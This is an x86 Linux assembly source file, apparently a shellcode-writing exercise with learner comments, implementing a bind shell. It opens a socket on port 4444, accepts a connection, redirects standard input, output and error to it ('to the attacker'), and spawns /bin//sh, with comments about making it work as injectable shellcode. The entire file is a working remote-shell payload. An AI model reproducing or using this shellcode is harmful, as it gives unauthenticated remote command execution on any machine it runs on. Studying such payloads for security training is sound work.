global _start			

section .text
_start:
    ; setup socket
    xor eax, eax ; we do this both to create a 0x0 value and get eax ready
    push eax ; push 0x0 as third arg
    push 0x1 ; for second arg, the value of SOCK_STREAM
    push 0x2 ; first arg is AF_INET, set address family to ipv4
    xor ecx, ecx ; clear out ecx
    mov ecx, esp ; move our arg values into ecx (place a pointer to these values with an address stored in ecx)
    mov al, 102   ; we move the socketcall syscall value into al, to avoid padding
    xor ebx, ebx  ; SHELLCODE DID NOT WORK WITHOUT THIS HERE, IT WILL WORK WITH NASM BUT NOT AS SHELLCODE DUE TO REGISTER NOISE!!!
    mov bl, 1     ; we set function to 1, which is the value of socket
    int 0x80 ; call system interrupt 
    mov esi, eax ; we store the returning value of our syscall for later use in other functions

    
    ;create struct sockaddr
    xor ebx, ebx
    push ebx ; push 0x0 on for listening address
    push word 0x5C11 ; push on reversed value of 4444
    push word 0x2 ; push value of AF_INET MAY NEED TO BE WORD??
    mov ecx, esp ; store our created sockaddr struc in ecx
    push 0x10 ; push length of address on (16) third arg
    push ecx ; push our created structure on as second arg
    push esi ; push created socket fd on as first arg
    mov ecx, esp ; move our values into ecx for the syscall
    mov bl, 0x2 ; we set function to 2, which is the value of bind
    mov al, 102
    int 0x80

    ; listener
    push 0x1 ; set backlog to 1 (arg 2)
    push esi ; push socket fd on (arg 1)
    mov ecx, esp ; mov the parameters required for listen into ecx for when we call the syscall
    mov bl, 0x4 ; listen function value
    mov al, 102
    int 0x80

    ; accept

    push eax ; address
    push eax ; address
    push esi ; socket fd
    mov ecx, esp
    mov bl, 0x5 ; value for accept function
    mov al, 102
    int 0x80

    ; dup (redirect in, out, err to the attacker)
    mov ebx, eax ; store returned fd from previous syscall (satisfy arg1)
    xor ecx,ecx

loop:
    mov al, 63
    int 0x80 ; call DUP
    inc ecx ; increase by 1
    cmp cl, 0x4 ; run through 0,1,2
    jne loop ; continue when it hits 3

    ; spawn shell
    xor eax, eax
    push eax

    push 0x68732f6e
    push 0x69622f2f

    mov ebx, esp ; the null and //bin/sh get moved into ebx
    push eax ; push another null onto stack
    mov edx, esp ; move the null into edx
    push ebx ; the null and //bin/sh get pushed back onto stack
    mov ecx, esp ; they then get moved into ecx
    mov al, 11
    int 0x80
